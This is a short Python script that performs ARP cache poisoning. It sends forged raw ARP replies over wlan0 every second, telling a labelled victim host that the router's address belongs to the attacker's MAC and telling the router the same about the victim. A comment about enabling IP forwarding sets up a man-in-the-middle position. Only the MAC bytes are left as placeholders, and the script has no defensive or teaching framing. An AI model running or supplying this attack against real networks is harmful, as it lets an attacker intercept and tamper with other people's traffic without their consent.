# completed

import socket
import struct  
import time

# '\x__\x__\x__\x__\x__\x__' replace __ with mac address bytes
# also change other info accordingly
# make sure to enable packet forwarding - sudo echo 1 | tee /proc/sys/net/ipv4/ip_forward(for linux)

#victim mac
dstmac = b'\x__\x__\x__\x__\x__\x__'
#router ip
srcip = b'\xc0\xa8\xe0\x21'
#router mac
srcmac = b'\x__\x__\x__\x__\x__\x__'
#victim ip
dstip = b'\xc0\xa8\xe0\x71'

def arp(srcip, dstmac, dstip):

    rawSock = socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.htons(0x800))
    rawSock.bind(('wlan0',socket.htons(0x800)))

    # (victim mac , attacker mac , identifier for next higher layer protocol(arp))
    ethPacket = struct.pack('!6s6s2s', dstmac, b'\x__\x__\x__\x__\x__\x__', b'\x08\x06')
    # hdwType(ethernet) , protocol type (ipv4), hdwSize, protocol size, opcode, attacker mac, router ip, window mac, window ip
    arpPacket = struct.pack('!2s2s1s1s2s6s4s6s4s', b'\x00\x01', b'\x08\x00', b'\x06', b'\x04', b'\x00\x02', b'\x__\x__\x__\x__\x__\x__', srcip, dstmac, dstip )

    rawSock.send(ethPacket+arpPacket)

while True:
    arp(srcip,dstmac,dstip)
    arp(dstip,srcmac,srcip)
    time.sleep(1)
